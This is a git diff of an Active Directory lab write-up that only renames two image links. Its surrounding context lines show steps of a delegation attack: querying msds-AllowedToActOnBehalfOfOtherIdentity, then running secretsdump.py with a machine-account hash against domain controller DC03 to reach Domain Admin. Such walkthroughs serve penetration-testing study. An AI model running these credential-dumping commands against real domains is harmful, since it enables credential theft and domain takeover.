@@ -733,7 +733,7 @@ Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -Server 10.0.0
 
 We didn't get any output since we are in a shell. But we can check the attribute again to see of it worked:
 
-![](<../../../.gitbook/assets/image (75) (1) (1).png>)
+![](<../../../.gitbook/assets/image (75) (1) (1) (1).png>)
 
 Seems like it worked, now we can check the value of the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute by saving it in a variable and doing some PowerShell confu to decrypt it:
 
@@ -917,7 +917,7 @@ secretsdump.py LOCAL -system ~/adlab/share/SYSTEM -security ~/adlab/share/SECURI
 secretsdump.py 'secure.local/dc03$'@dc03.secure.local -hashes aad3b435b51404eeaad3b435b51404ee:ba6414d4e6ce546465b256950282c7f3
 ```
 
-![](<../../../.gitbook/assets/image (57) (1).png>)
+![](<../../../.gitbook/assets/image (57) (1) (1).png>)
 
 7\. We retrieved the Administrator hash and can authenticate as `Domain Admin` to the Domain Controller `DC03` of `Secure.local`.
 
